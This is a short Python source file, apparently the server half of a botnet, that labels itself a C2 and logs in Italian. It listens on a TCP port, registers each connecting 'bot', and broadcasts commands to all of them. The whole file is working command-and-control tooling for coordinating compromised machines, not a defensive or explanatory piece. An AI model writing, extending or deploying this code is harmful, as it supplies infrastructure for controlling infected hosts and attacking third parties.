import socket
import threading

HOST = '0.0.0.0'
PORT = 9000

bots = []
bot_addresses = []

def handle_bots():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen()
        print(f"[C2] In ascolto su {HOST}:{PORT}")
        while True:
            conn, addr = server.accept()
            bots.append(conn)
            bot_addresses.append(f"{addr[0]}:{addr[1]}")
            print(f"[C2] Nuovo bot: {addr}")

def send_command_to_bots(command):
    for bot in bots:
        try:
            bot.sendall(command.encode())
        except:
            bots.remove(bot)
